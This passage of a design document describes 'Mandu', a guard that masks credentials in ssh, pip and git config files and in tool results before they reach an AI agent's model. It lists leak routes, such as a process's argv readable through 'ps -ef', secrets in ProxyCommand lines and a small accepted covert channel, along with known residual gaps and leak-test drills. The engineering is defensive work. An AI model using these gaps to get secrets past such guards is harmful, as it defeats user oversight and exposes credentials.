in an environment value (`EMBEDDED_URL_PASSWORD_RE`), such as a
multi-URL `PIP_EXTRA_INDEX_URL`, masks the whole value (fail-safe).

Tests: `secret-extract.test.ts`, `secret-registry.test.ts` (the server's
scheme rule on a mutated token), `flow-taint.test.ts`,
`arbiter/test/component/npmrc-wire-twin.test.ts` (an obsoleted wire row
and its copy; an `asCommand` ask under both rules),
`launcher/test/unit/wire-release.test.ts` (the pid, the withdrawal),
`wire-release-sessions.test.ts` (the store across a reopen: a live, a
gone and a reused pid, a withdrawal, a malformed row),
`tests/stack/wire-release-restart.test.ts` (the real arbiter restarted on
the same mandu.db under a live session: npm keeps the twin and the
production net-proxy adapter still puts the token back at its registry
only; a gone or withdrawn launch's word does not come back; the data
socket cannot give it; it failed before the fix),
`tests/stack/pip-ipv6-wire-release.test.ts` (the real NetProxy with TLS
inspection over the real arbiter: a `pip.conf` and a `PIP_INDEX_URL` index
on IPv6 literals released at their own address in three spellings, refused
at another address, at each other's and over plain HTTP; an `http://`
index on `[::1]` released there only; it failed before the fix),
`secret-extract.test.ts` and `host-bindings.test.ts` (the IPv6 rules,
the port), net-proxy `ipv6-literal.test.ts` and `destination.test.ts`,
`tests/stack/inspected-leg-port.test.ts` (the real NetProxy over the real
arbiter: a grant to `:8443` released there and refused at `:443` on the
inspected leg, named and IPv6; a portless grant at both; an `http://`
grant to `:8080` refused at port 80; a holder of a file bound to
`tunnel.example:8443` tunnels there only; it failed before the fix),
`egress.test.ts`,
`npmrc-registry-release.test.ts` and `basic-wire-release.test.ts` (the
real NetProxy over the real arbiter through the production adapter: the
credential put back only at its bound host and scheme; decoys, a
cross-bound symbol, a workspace file's symbol and an unattributed sender in
a holding session refused), `wire-credential-position.test.ts` (the same
wiring, both legs: the header gets the value; a publish document's body,
the query and another header get a 403 and no byte; no splice; a label's
binding releases anywhere), `current-bindings.test.ts` and
`auth-grant.test.ts` (automatic versus declared), and the sandbox suites
`npmrc-wire-twin` (W1–W4: real launcher, guard and proxy around `npx -y`;
W2, the opt-out, is the red control) and `pip-wire-twin`.

**Found on the way: a holder's `cmdline`** was readable by untainted
processes, so a reader shell's child argv (`curl -H "Authorization: Bearer
$KEY"`) reached the model through `ps -ef`. It is now on the introspection
list (§4.1). `stat`, `status` and `comm` stay readable (the name is at most
15 bytes the program sets itself, a covert channel of the kind §6 accepts).
Test: `send_integration.rs` `a_holders_argv_is_refused_to_an_untainted_reader`.

**Oracles for any later change to inheritance** (kernel tests, run by
`scripts/kernel-tests.sh`): a parent reads a secret raw (bound to
`127.0.0.2`), passes it through ONE channel of the table, and execs or
forks a helper that is no reader; the helper must be refused at an unbound
`127.0.0.3`, have its written file labelled, and report a non-null
`processSecretTaint`. One case per channel, each with a liveness control
(the same helper under an untainted parent reaches `127.0.0.3`).

### 11.13 Twins the reading program still parses (2026-10-02)

A file the catalog labels because it CAN hold a secret got the whole-file
placeholder although it held none, or held one in a single field, and the
program that parses it refused the placeholder (ssh failed on
`~/.ssh/config` with `bad configuration options`, so git over ssh failed;
the same broke `pip.conf` and git's `store` helper). Decided per file:

| File | Labelled? | What the agent's programs read | Who reads the real file |
|---|---|---|---|
| `~/.ssh/config`, `~/.ssh/config.d/*` | yes | `ssh-config` twin, fail-closed (§11.13.2): own text where the format makes a value public; unvouched commands withheld with Mandu's notice (§11.13.3) | nobody needs it: ssh parses the twin |
| `~/.ssh/known_hosts*`, `authorized_keys*`, `allowed_signers`, `*.pub` | **no** (public material) | the real file (ssh writes new host keys there) | everyone |
| `~/.ssh/id_*` and other keys | yes | whole-file twin | ssh, git, scp, ssh-add (consumer table) |
| `pip.conf`, `pip.ini` (`~/.config/pip`, `~/.pip`) | yes | `pip-conf` twin, fail-closed (§11.13.2); URL credentials percent-encoded | nobody (pip runs as `python`); an index password in the HOME file is put back by the session proxy (§11.13.1) |
| `~/.git-credentials`, `~/.config/git/credentials` | yes | `git-credentials` twin, fail-closed: each line exactly one URL, credentials as symbols | **git**, a known consumer and, since 2026-10-04, a printer (Plan 13 §4.9): the `store` helper reads the twin, and the session proxy puts the password back at its host under TLS inspection; without it the login fails. Until then it got the real password, tainted git, and git's output reached the model masked |

- **Exhaustive shapes.** For these three shapes (`shapeIsExhaustive`) an
  extraction with no span means no secret, so the twin is the file's own
  text; every other shape keeps the whole-file twin. A human or derived
  label on the same file keeps the whole-file twin.
- **`known_hosts` leaves the catalog**: it holds no credential and ssh
  writes it. A tool's read or write of it still asks (fs-outbound's
  `SENSITIVE_PATHS`), and `authorized_keys` and `config` are
  write-protected (`write-protection.md`).
- **git is a reader**, since its store helper builds a Basic header from
  the file (as `.netrc`).
- **The model boundary.** A twin with field symbols is released by the
  read-twin rules (§11.8). An own-text twin reaches the model as its text
  since 2026-10-17 (below); until then it was one handle.
- **The whole-file twin ends as the file does** (`wholeFileTwinText`: no
  terminator, `\n` or `\r\n`), so Codex does not quote an extra blank row
  (`differential-interactive.md` §16).

**A config with no secret reaches the model as its text (2026-10-17).** The
agent's programs read an own-text twin as the file's text, but the model
got one handle for it: a Read of `~/.ssh/config` named a catalog path, the
read-twin rules need a field token, and the file's own base row (its whole
text, and each line of 24 characters or more) was a value-backstop
fingerprint, so even a `cat` through a copy came back masked. Now:

- **Which file.** `isOwnTextTwin` (registry.ts): an exhaustive shape whose
  extraction finds no secret value, the credential belt of §2.4 (!1621)
  included, so every place the format can hold a secret was read and found
  public, and an unknown keyword, a comment, a `SetEnv` value or a withheld
  command is a field (the twin is then structured, released per field as
  before). On the CATALOG's word only, under the arbiter's HOME or a HOME
  the human plane named (a launch's `beginLaunch`, a launcher's
  `registerSecret`): a human or derived label, or a path no attested HOME's
  catalog names, keeps the whole-file handle. There is no "parse failure"
  case left open: a file the extractor cannot read in place (no shape, not
  UTF-8, over the size floor) is a whole-file twin, never own text.
- **The read leg** (`isOwnTextTwinText`, policy-interface.ts): a built-in
  read (Claude Code's `Read` under its own spec entry, gutters stripped;
  OpenClaw's and OpenCode's `read`, frames stripped) whose text is a
  non-empty, token-free, contiguous piece of the NEWEST registration's own
  text (`ownTextTwinFor`) is public: the rendering carries what the agent's
  programs read.
- **The shell leg** (`ownTextTwinExecOutputPath`): a token-free output
  (after Codex's head, one final newline as framing) that is one piece of
  the own text of ONE config the call's command names (the key listing's
  candidates), answered in `callTaint` as `twinOf` + `twinOwn` on the
  structured rule's evidence (a tree the guard recorded, no raw secret open
  in it). The proxies send such an output only for a command that may name
  one of these configs (`mayBeOwnTextTwin`, byte-identical in both), lower
  the path-derived mask, and add `twin: this is <path> as it is: Mandu read
  every place in it that can hold a secret and found none, so you see its
  text.` (no line when nothing was masked).
- **The backstop.** An own-text base row, and any other whole-text row on
  that path that is a piece of the own text now (a proxy's Read row of an
  earlier masked read), is not counted (`isOwnTextRow`, server.ts
  `backstopRowLevel`), and a proxy's row on the path drops the own text's
  lines from its line fingerprints (`registeredTwinOfPath`), as for a
  structured twin. Everything else still counts: every FIELD row (an old
  registration's secret now in a public place of the file stays a
  fingerprint), every registered value from elsewhere (an environment
  secret written as a `User`), and a proxy row's other lines (a secret the
  file did not have at registration). The egress tripwire keeps the base
  row: the config's text leaving the machine still trips it.
- **The launch's HOME** (the same date). Which places are the catalog's
  `~` is decided per session by the launch's HOME as its launcher recorded
  it on an attested `beginLaunch` (`home`), as well as the arbiter's own,
  the stricter deciding (`stricterMatch`), in `decideSecretOpen` and in the
  classify derivation; `~` in a command names that HOME in `callTaint`.
  Before, both used the arbiter's HOME alone: a launch under another HOME
  had every program (ssh, a known consumer of its key, included) served
  the twin of that HOME's files (fail-safe, no login), and its files
  reached classify as no catalog path. A data-socket request names no
  session's HOME; a launch's HOME ends with it, and after an arbiter
  restart a session is judged by the arbiter's HOME until its next launch
  (the twin again: fail-safe).
- **`mandu why` and the whole-file legs under a launch HOME** (the same
  date). Which twin a registered file makes is read by one rule,
  `twinMatchOf` (registry.ts): a human or derived label under any HOME,
  else the catalog's word under the arbiter's HOME or a HOME the human
  plane named (the live launches', the launcher's registrations'), else
  the arbiter's HOME's match. `isOwnTextTwin`, `wholeFileTwinOfBase` (the
  exec-output leg of "A document's own twin") and `wholeFileTwinFor` (its
  read leg) and `whyPath`'s `twin` all decide by it (`whyPath` adds the
  caller's `home`, which a launch from it would name: what a launch would
  do). Before, the whole-file legs read the arbiter's HOME alone and
  `whyPath` the caller's `home` alone: a config with no secret under a
  launch HOME the arbiter does not share was a whole-file twin to the
  legs while the guard served its own text (a wrong answer, no leak: a
  whole-file answer only names a token). And
  `whyPath` judges the level as `decideSecretOpen` does, the stricter of
  the caller's `home` and a launch's HOME: on the human plane, the launch
  of the request's `session` (`mandu why <file> --session <id>`), else the
  NEWEST live launch, and the answer names it (`launch`; `mandu why`
  prints `home  also judged under …, the HOME session … was started
  with`, or that the named session is not running). `mandu why` asks the
  human socket first for a file too (as for a placeholder); from inside
  the agent's world it reaches only the data socket, which names no
  session's HOME, and `--session` there says so. Before, from the user's
  terminal, `mandu why /tmp/x/.ssh/config` for a session started with
  `HOME=/tmp/x` said "Not secret" while that session's programs got the
  file's twin. Tests: `own-text-twin.test.ts` (two HOMEs),
  launcher `why.test.ts`, `tests/stack/why-cli.test.ts` (the production
  call path, a launch HOME that is neither the arbiter's nor the
  caller's).

Residuals: git's store helper cannot rewrite the store (its rename onto
the file is refused in both postures, §4.1); a
custom-named ssh key is a whole-file twin to `ssh -i` (only `id_*` is in
the consumer table); a short registered value (under the backstop's
8-character floor) in a public place of an own-text config reaches the
model with it, as §11.13.2's "not covered" says of a short password; a
`cat` whose command names a config only by a relative name from a
directory the screen does not recognise (`cd ~/.ssh/config.d && cat
plain`) stays one handle. Tests: `secret-extract.test.ts`,
`secret-registry.test.ts`, `secret-catalog.test.ts`, `flow-taint.test.ts`,
`own-text-twin.test.ts` (arbiter unit), both proxies' `rewrite-request`
unit tests (§11.13), launcher `cache-seals.test.ts` (the record carries the
HOME), `tests/stack/own-text-config-twin.test.ts` (two launches with
different HOMEs on one arbiter; the config's text through `Read` and `cat`,
and every negative above, no canary at the model boundary),
`tests/stack/config-twin-fidelity.test.ts` (no canary at the model
boundary) and `tests/sandbox/launcher/twin-format-fidelity.test.ts` (under
the real launcher and guard `ssh -G` parses the twin and its `Include`,
`ssh-keygen -F` reads the real `known_hosts`, pip parses both twins, git's
store helper returns the real password, no canary in the agent's output).

#### 11.13.2 The own-text twin fails closed (2026-10-02)

An own-text twin is only as safe as the extractor's recall, and a
recall-based extractor let through a password in a `ProxyCommand` (`mysql
-phunter2`, `ncat --proxy-auth`), a token in a `LocalCommand`, a `SetEnv`
value with a harmless name, a token in a pip index URL's PATH, a token used
as a URL's user, unknown keys, and comments (`# old password: …`). **The
rule now: raw only where the format says public, and only in a public
shape** (`secret-extract.ts`):

- **ssh_config, keyword by keyword.** Hosts, users, ports, paths, flags,
  algorithm lists and forwarding rules stay raw. `ProxyCommand` (and `Match
  exec`) stays raw as `none` or when `proxyCommandSafe` vouches for it: a
  plain word list (no pipe, redirection, substitution, glob or escape),
  optionally after `exec`, running `ssh` with public options or a known
  relay (`nc`/`ncat`/`netcat`, `socat` without `proxyauth=`,
  `connect-proxy`, `corkscrew`, `cloudflared access ssh`, `aws ssm
  start-session`, `gcloud compute start-iap-tunnel`) with only connection
  options and public arguments. `LocalCommand`, `RemoteCommand` and
  `KnownHostsCommand` stay raw only as `none`. Anything else is WITHHELD
  (§11.13.3). Every `SetEnv` value is a symbol; an unknown keyword masks
  its line (only its value under `IgnoreUnknown`).
- **pip.conf, key by key.** pip's own keys in the sections pip reads are
  read word by word; any other key's value is masked, and its name too
  when not a plain name.
- **The credential store, line by line**: exactly one URL, else masked.
- **URLs everywhere** (`addressSpans`): scheme, host and port stay; the
  password is masked; the user stays only as a plain lowercase login or a
  convention (`__token__`, `oauth2`, `x-access-token`, `git`, …); a path,
  query or fragment value stays only word-like and with no run shaped like
  a random credential (`credentialShaped`); a secret-named query parameter
  is always masked.
- **Comments** are masked, and **the detection belt**
  (`locateSecretShapes`) masks any known credential format the rules left
  raw.

**Utility cost (knowingly).** An ssh host whose `ProxyCommand` is off the
grammar (a wrapper script, `sshpass`, a pipe) and every host with a
`LocalCommand`, `RemoteCommand` or `KnownHostsCommand` fails inside the
agent's sessions, with a notice (§11.13.3); `SetEnv` values reach the
server as symbols. A pip index URL whose path holds a GUID (Azure Artifacts
project feeds) or a token fails to resolve (of the common indexes measured,
only those and AWS CodeArtifact's token are masked). **Not covered:** a
short password in a public place (a 7-character host name, a plain-word
user, a short path segment); the guarantee is that each kept place is
public by the format and carries no credential-shaped run. Tests:
`secret-extract.test.ts` (every case above, the relay grammar),
`config-twin-fidelity` and `twin-format-fidelity` (the vetted command reads
as written, the masked host fails with the notice, no canary).

#### 11.13.3 A withheld ssh command says where, why and the way out (2026-10-03)

The grammar of §11.13.2 is not widened; what changes is the failure. A
withheld command used to be a quoted symbol, and ssh printed `sh: 1:
$MDU:…ProxyCommand: not found`, naming neither file, line, Mandu nor a way
out. Now the span carries `withheld: { file, line, keyword }` (never the
command's text) and `withheldCommandTwin` writes in its place

```
/bin/sh -c 'set -f; for l; do echo $l; done >&2; exit 1' '<field symbol>' '<line 1>' '<line 2>' '<line 3>'
```

with message lines that are shell- and ssh-inert, so the one rendering runs
the same as a `ProxyCommand`, `LocalCommand`, `Match exec`,
`KnownHostsCommand` and `RemoteCommand` (the file is named from `~/.ssh/`
on, so the user's name does not reach a server). The unused `$0` keeps a
field in the twin, so the read-twin release is unchanged. ssh prints:

```
mandu: ~/.ssh/config line 7: ProxyCommand withheld from the programs the agent runs, so ssh cannot reach this host from inside the agent.
mandu: why: Mandu cannot vouch for this command. Its text may hold a secret, and running it would run code holding one. The command is not shown.
mandu: way out: use ProxyJump or plain ssh -W; or move the command into a script Mandu can pin and let ssh read the real file (mandu why ~/.ssh/config shows how); or run this ssh outside the agent.
```

The model can relay it. `whyPath` answers `withheld: [{ line, keyword }]`
(`withheldCommands`), and `mandu why ~/.ssh/config` and the dashboard's
*Why?* give the way out in full: (1) `ProxyJump`, `ssh -W` or a known
relay; (2) a script the agent cannot change, with `readers: [ssh]` and
`others: twin` on `~/.ssh/config` (ssh then holds the file like any reader),
or the script pinned with its interpreter (§2.3); (3) run that ssh outside
the agent. No byte of a withheld command is in the twin, the message, the
answer or the dashboard. Verified against OpenSSH 10.2 for all five forms.
Tests: `secret-extract.test.ts`, `arbiter/test/component/why.test.ts`,
`launcher/test/unit/why.test.ts`, the dashboard's
`view-model/file-browser.test.ts`, and the two e2e suites above (real ssh
prints the notice; no canary reaches the model).

### 11.14 The agent runtime's own result head is not a registered line (2026-10-03)

A Codex exec result masked whole is registered as a secret value, and a
multi-line value also registers every line of 24 or more characters
(`model-endpoints.md` §1.8 item 1, `MIN_LINE_FINGERPRINT_LEN`). Those lines included the
head Codex's runtime writes in front of every exec output (`Process exited
with code 0`, `Wall time: 0.0123 seconds`, `Original token count: 11`, …),
so every later result repeating one hit the value backstop and was masked
whole: fail-closed, but after one masked `cat` most later results were one
handle.

**Rule.** A registered value's line fingerprints skip the head the agent's
runtime itself wrote, and nothing else. The openai-proxy sends
`resultHead: "codex"` on the `symbolize` request only when it symbolizes the
WHOLE output of a call Codex made (`codexWholeOutput`; never for the
envelope split's body-only symbol). The arbiter checks its own exact
grammar of that head at offset 0 of the value
(`arbiter/policy/agent-result-head.ts`: chunk id, optional wall time,
exactly one exit or running-session line, optional token count, `Output:`;
or the script cell's status line); a value that does not start with exactly
the grammar keeps every line, and a head-like line anywhere else stays
registered. Only the head's lines stop being fingerprints
(`lineFingerprints(value, from)`); the whole value and every body line
stay, and the model still sees only the symbol. Tests: arbiter
`agent-result-head.test.ts`, openai-proxy `rewrite-request.test.ts`, and
the e2e `tests/stack/codex-result-head.test.ts` (the secret never reaches
the model; a later clean result with only Codex's head lines is forwarded
raw; a file line that reads like a head line still masks).

**Two more heads, and durable marks (2026-10-09).** `resultHead` names a
kind, each matched only by its own grammar at offset 0:

- `codex`: the exec and script-cell head above;
- `codex-mcp`: Codex's MCP call head, `Wall time: N seconds\nOutput:`
  (digits only; in the parts form the server's text follows directly, in
  the string form after one `\n`). The openai-proxy names it on a known
  MCP call whose output has that shape and is masked WHOLE (its header not
  vouched for apart, e.g. the call names a secret path);
  `codexResultHeadKind`;
- `claude-task`: the status tags Claude Code writes in front of a polled
  background task's output (`TaskOutput`: `<retrieval_status>`, `<task_id>`,
  `<task_type>`, `<status>`, `<exit_code>`, then `<output>`; the older
  `BashOutput`: `<status>`, `<exit_code>`, then `<stdout>`). Each payload
  is a word from a closed set, digits, a task id of at most 64 word
  characters (the id the model named in its call) or a lower-case type
  word, and the head ends at the output's open tag, so the task's own bytes
  never fall inside it. The anthropic-proxy names it on a `BashOutput` /
  `TaskOutput` result it symbolizes from its start (whole, or the body
  before a trailing reminder). A `TaskOutput` row is not an exec-output
  row, so it always counts in the value backstop: before this, one masked
  poll registered `<retrieval_status>success</retrieval_status>` and every
  later poll was masked by it. The grammar is the one Claude Code's
  `TaskOutput` / `BashOutput` printed when read; a release that changes
  the tags makes the head no match, which only keeps every line (the
  over-masking returns, never a release);
- `write-notice` (2026-10-11, [plan 15 §13.10](./confidentiality-plan-15-prompt-filter.md),
  "The notice is no piece"): a write tool's fixed success sentence on the
  first line of its result (Claude Code's `Write`, the `write` of OpenCode
  1 and 2, Goose and OpenClaw). The only kind that reads the row: its path
  span must be the row's own stored origin (or a relative path the arbiter
  placed under it), counts are digits, and only a `Write` / `write` row
  that is not a field row takes it. Both proxies name it on a known
  `Write` / `write` call's text result. A write row whose WHOLE value is
  such a notice is all head without a mark (it holds the sentence, its own
  path and digits, nothing else), and a value that is all head, of any
  kind, gives the index no pattern at all, its whole value included.

The marks are stored with the row (`result_heads` in mandu.db,
`symbol-table/result-heads.ts`, schema v10), each bound to the SHA-256 of
the value it was learned on: loaded at start, so a restart no longer makes
the head lines count until the result is re-sent; a mark whose row is gone
or holds another value is not loaded. A mark only lets the index re-match
its kind's grammar on the row's own value: it never removes a body line
or a credential-shaped piece, nor the whole value of a row that has a
body. Tests: arbiter
`agent-result-head.test.ts` (each grammar, its misses, the store, a real
server restarted), openai-proxy `rewrite-request.test.ts`, anthropic-proxy
`background-poll.test.ts`; e2e `tests/stack/codex-result-head.test.ts`
(the restart and the MCP head through the real proxy) and
`tests/stack/claude-background-poll.test.ts`.

### 11.15 A short known secret is a registered piece of its value (2026-10-03)

The value backstop (§2.2), the egress tripwire and the prompt filter (plan
15 §4.1) matched a registered secret by its whole value (at least
`MIN_FINGERPRINT_LEN` = 8) or a line of at least 24 characters, so a short
secret (8 to 23 characters) was matched only inside a whole value that
never recurs (a Codex result carries a random chunk id; a one-line file is
registered with its final `\n`).

**Rule.** Each registered secret row also contributes its PIECES
(`egress-fingerprint.ts` `valueFingerprints`, used by the value index and
the tripwire alike), each a value already known to be secret: its long
lines (less a runtime head); the value without its final line terminator;
every credential-shaped span the detectors find (`locateSecretShapes`) of
at least 12 characters and 3.0 bits a character (plan 15's floor,
`MIN_SPAN_FINGERPRINT_LEN`); and, for a row registered from a labelled FILE
(`isRegisteredFileRow`), each bare token that passes `looksLikeSecretValue`
(`bareSecretTokens`: 12+ characters, random-looking, not a placeholder), so
`password Tq7vZ2pX9kLm` in a notes file is covered while prose,
identifiers and placeholders never are. An exec-output row counts only on
evidence, a twin piece never.

**A file the launch never registered** (labelled later, outside the
discovery roots, a derived copy): when the guard reports on the human plane
that a labelled file was read RAW, the arbiter registers that file itself
(`registerReadFile` → `registerSecret`, at the label's level and bindings).
A data-socket claim never makes the arbiter read a file. Idempotent per
size, mtime and inode; files over 1 MiB or binary were skipped (registered
since §11.18, up to the piece bound; a holder's copy too). A file whose
current text the launch already registered, under any session key, at a
level at least the label's (`registry.ts` `fileRegisteredAsIs`), is not
registered again: a second row under the self-registration's key (no
session, no launch HOME, so no wire binding) became the newest registration
a second later and took npm's `.npmrc` wire twin (§11.13.1) away.

Tests: arbiter `value-pieces.test.ts`, `value-matcher.test.ts`,
`read-file-registration.test.ts` (`fileRegisteredAsIs` included),
`npmrc-wire-twin.test.ts` (a raw read two seconds after a session-keyed
launch registration adds no row and keeps the wire twin), and the e2e
`tests/stack/codex-short-secret.test.ts` (a registered one-line secret
file, an unregistered `.env` and an unregistered notes file, each short
secret printed again by a later call, never reach the model; a short prose
line of the same output is forwarded raw; each red with its rule disabled).

### 11.16 An OpenCode read registers the file's text, not OpenCode's frame (2026-10-05)

The first live OpenCode run (drills conf-read-exfil, conf-net-exfil-blocked,
conf-read-control on one arbiter) leaked nothing, but the control failed: its
UNLABELLED `partner-token.md`, holding a token of its own, reached the model as
`$MDU:nomodel_read[…]`. The arbiter's reason named the two earlier sessions'
rows: "a registered secret (or a line of one) appears verbatim". Those rows were
the labelled `vault/partner-token.md` reads, masked whole and registered with
OpenCode's whole rendering as their value:

```
<path>/…/vault/partner-token.md</path>
<type>file</type>
<content>
1: $MDU:nomodel_Read[79be]

(End of file - total 1 lines)
</content>
```

Its trailer, 29 characters, is a line long enough to fingerprint alone
(`MIN_LINE_FINGERPRINT_LEN`), so the value backstop raised every later
OpenCode read of a one-line file to no-model, in any session of that arbiter.
The same as §11.14 (a runtime's own lines registered as a secret's), on the
read path. The value was also wrong in itself: what an egress or a write-back
resolves the symbol to was OpenCode's frame, not the file. Claude Code's `Read`
has stored the file's bytes since 2026-09-21 (`unrenderReadResult`,
`read-result-rendering.md` §3); OpenCode's `read` had no counterpart.

**Rule.** Under the `opencode` spec (the session's gate surface), the
anthropic-proxy stores behind a masked `read` the text of the lines its
rendering carries (`unrenderOpencodeReadResult`, the arbiter's
`opencodeReadRenderingText` grammar to the byte, pinned by a parity test): the
`<path>` absolute and one the call named, consecutive `n: ` gutters, one of the
two pinned trailers. Anything else (a capped read, a trailing
`<system-reminder>` carrying an instruction file, a gap in the numbering) keeps
the wire bytes as before: over-masking, never under. Nothing here forwards a
byte: the result is one symbol either way. Every line of the file stays a
registered line (a wire line is `n: ` plus it), the whole value now matches the
file's text where it reappears, and only the frame stops being registered. The
text has no final newline (the rendering does not say whether the file had
one).

**Not a shared-state bug.** A value registered no-model stays masked wherever it
reappears, in any session of the same arbiter: that is the backstop's job
(§2.2), and the drills of one run share their arbiter on purpose. The control
reads its own token (`CONFCTL_…`), never the labelled one, so a correct backstop
leaves it raw; the over-masking came only from the frame. The control now
checks it directly (`canary_present`: its token in the model's input), so an
over-block fails there instead of passing as a WARN on the send.

**Other agents.** Claude Code: un-rendered since 2026-09-21; its live control
rode raw (2026-10-03). Codex: §11.14. OpenClaw prints a read's lines as they are
and appends at most one continuation notice (`[2 more lines in file. Use
offset=2 to continue.]`, `[Showing lines A-B of N. …]`, `[Read output capped at
50KB for this call. …]`). Its numbers are the file's, but any read of any file
that stops at the same line prints the same 49 characters, so a stored notice
masked those too. Since 2026-10-09, under an OpenClaw spec (`openclaw-agent`,
or the frozen `openclaw`), the proxy stores behind a masked `read` the text
before that notice (`unrenderOpenclawReadResult`, the arbiter's
`openclawReadRenderingText` notice grammar, pinned by a parity test): only a
notice at the end, after a blank line, made of the source's fixed words and
digits (read off the pinned OpenClaw 2026.7.1 `sessions-*.js` and
`openclaw-tools-*.js`), is removed; no notice, or anything else, keeps the
wire bytes. Goose: its read is a shell `cat`, whose output is the file.

Tests: anthropic-proxy `rewrite-request.test.ts` (the grammar, the spec and
tool gate), and the e2e `tests/stack/opencode-read-value.test.ts` (two OpenCode
sessions on one arbiter: the labelled read is one symbol whose value is the
file's text; the unlabelled one-line control in the other session rides raw;
the secret printed again by a route no label sees is still masked; the
proxy's parser and the arbiter's agree; red without the rule, with the live
symptom). OpenClaw: the same tests (its notice strip and gate), and
`tests/stack/openclaw-read-value.test.ts` (a limited read of a labelled file
whose symbol resolves to the file's text; an unlabelled read ending in the same
notice in another session rides raw; red without the rule).

### 11.17 An MCP mapping follows its config (2026-10-07)

**Status: BUILT.** Confidentiality axis only. Closes the two residuals §11.13
left: a server whose config changed after the launch, and a Codex that
renames its MCP resource tools.

**(a) A config changed mid-session.** §11.13's registration was read once,
before the agent started. That was worse than "the server stays unmapped":
when the agent edited a server's entry and reloaded it, the registration
still named the OLD command line, the old process (clean, the only one with
that argv) answered `clean`, and the result of the NEW process skipped the
session rule, raw even when the new tree had read a secret raw. On OpenCode
and Goose nothing was mapped at all, and their MCP tools carry no `mcp__`
prefix (OpenCode `<server>_<tool>`, Goose `<extension>__<tool>`), so rule (c)
never applied: an MCP result was forwarded raw in a session holding a raw
read, whenever the server was configured. Three parts, each only adds
masking:

1. **The arbiter checks the config's stamps.** `registerMcpServers` carries
   `sources`: every file the launcher's read consulted, present or not (a
   project `.mcp.json` created later counts), each with its stamp when read
   (`mcpSourceStamp`: device, inode, size, mtime and ctime in ns, or
   `absent`; the launcher stamps a file BEFORE reading it, so a write in
   between leaves a moved stamp, never a stamp that vouches for content the
   read did not see). The latest registration's list replaces the last.
   Before answering `clean`, `mcpServerTaint` stats each source; one that
   moved answers `unmapped` (`configChanged`), so the result takes rule (c)
   until the re-read lands. A list over the cap of 256 ends in a source no
   stamp matches (never `clean`). A malformed list is refused whole.
2. **The launcher re-reads on every change.** After the launch registration
   the launcher keeps a watch for the session (`watchMcpConfig`, every
   500 ms): it stamps each source of the last accepted read, and when one
   moved it reads the config again and registers it (also when it now names
   no server, so the stamps are replaced). Registration stays add-only, so
   a server whose command line changed is named by both; its two processes
   make it `tainted` (either tree read raw) or `unmapped` (two candidates),
   never `clean`. A failed registration is retried on the next tick; the
   arbiter's stamp check fails closed meanwhile. Polling, not a file watch:
   Claude Code rewrites `.claude.json` by rename. The cost of the stamp
   check: Claude Code rewrites `~/.claude.json` during a session, and for
   up to one tick after each write a clean server takes rule (c).
3. **OpenCode and Goose** (no per-server mapping, MCP tools with no `mcp__`
   prefix): first built here as rule (c) for every tool the spec does not
   name (a gate-surface flag), the same day replaced by §11.18, which masks
   such a tool whole whatever the session read.

**(b) A renamed resource tool.** First built here as a shape match (a name
saying MCP resource, a `{server, uri}` input, a resources/list|read result,
in a file both proxies carried); the same day §11.18 made it unnecessary:
a resource tool, renamed or not, has no mapping, so it is masked whole, and
the shape match was removed.

Tests: `arbiter/test/component/mcp-server-taint.test.ts` (a moved stamp, a
created file, the re-read adding the new line; red without the check),
`launcher/test/unit/mcp-config-watch.test.ts` (the sources, stamped before
read; the watch's re-read, retry and one warning; a real file edited on
disk), `launcher/test/unit/mcp-server-config.test.ts`, and the leak oracle
`tests/stack/mcp-config-change.test.ts` (the real launcher watch, the real
arbiter and both production adapters: a Claude Code and a Codex server
edited mid-session to a command line that reads a secret raw, masked before
and after the re-read; the two stamp functions agree; red without each
part).

### 11.18 A tool Mandu has no mapping for is masked whole (2026-10-07)

**Status: BUILT.** Confidentiality axis only (`secrets`, `full`). The
maintainer's decision of 2026-10-07 (P0 item 4b), which answers the
unknown-tool question §11.11 to §11.17 left open: a tool Mandu has no
mapping for (an unmapped MCP tool, a plugin's custom tool, a renamed tool,
any harness tool no spec names) has its result masked WHOLE, one
placeholder at `no-model`, whatever the session read, on every agent,
unless policy.yaml marks it mapped. Before, such a result was masked only
by the labeled paths its input named, by the programs a command-like input
ran, or (an MCP tool, rule (c)) while the session held a raw read; a
plugin's tool that read a file in-process, or a remote MCP server, reached
the model raw in a session that read nothing raw.

**What has a mapping** (`arbiter/policy/mapped-tools.ts` `toolMapping`, in
this order):

1. Mandu's own tools (inspect, declassify, policy), in every agent's
   spelling.
2. A tool the session's inbound spec names (its built-ins).
3. A harness tool the spec leaves out on purpose whose result is the
   agent's own bookkeeping (`HARNESS_MAPPED_TOOLS`): Claude Code's
   `ToolSearch` and Goose's code-mode `list_functions` /
   `get_function_details` return the tool catalog the model already reads
   in every request's `tools[]`; OpenCode's `invalid` and `plan_exit`
   answer with the agent's own text.
4. A tool the session's gate surface names (`tool-gate-surface.ts`: a tool
   whose paths, command, host or patch Mandu reads, as Goose's `analyze`,
   `read_image` and the document tools, left out of the spec so their
   input is scanned).
5. An `mcp__` tool of a stdio server the launcher registered from the
   agent's config (§11.13, §11.17): the per-server rule decides, and rule
   (c) for a server it cannot pin to one process.
6. A tool listed under policy.yaml `mapped_tools:`.
7. Codex has no inbound spec: the openai-proxy names its built-ins
   (`CODEX_MAPPED_TOOLS`: `apply_patch`, `update_plan`, `view_image`,
   `wait`, `write_stdin`, the `exec` and `js_repl` cells, `tool_search`,
   `request_user_input`, the experimental file tools, the sub-agent tools;
   its shells are EXEC_TOOL_NAMES) and asks about one only when it carries
   a command or the proxy could not tie it, with `builtin: true`, which the
   arbiter takes as a mapping. Codex's MCP resource tools are not on the
   list: they read a server named by the model's own text.

**Enforcement.** Both proxies ask `callTaint{unmappedTool}` about every
result of a tool that is not the agent's shell (a clean registered server's
`mcp__` tool excepted, as before). The arbiter answers `evidence:
"unmapped"`, level `no-model`, with the note (`unmappedToolWhy`) for a tool
with no mapping; empty for (1) to (4) and (6), as for a tool the spec
names; and the §11.12/§11.13 rules for (5) and (7). The proxy masks an
`unmapped` answer whole and puts the note in the result: "Mandu has no
mapping for the tool X, so its whole result is hidden from the AI: it may
carry a secret no check of Mandu's can see. To let it through, list X (or
`mcp:<server>` for every tool of that MCP server) under `mapped_tools:` in
policy.yaml". An ask that fails masks (fail-closed); an arbiter without the
op masks nothing (an older arbiter: the earlier rules). With the axis off
the arbiter answers empty.

**`mapped_tools:`** (policy.yaml, the person's file only; the agent's
policy tools cannot propose it, and the Mandu home is write-protected):
a list of `<tool>` (the name the agent gives it), `<prefix>*`, or
`mcp:<server>` (every tool of that MCP server in each agent's spelling:
`mcp__<server>__` for Claude Code and Codex, `<server>_` for OpenCode,
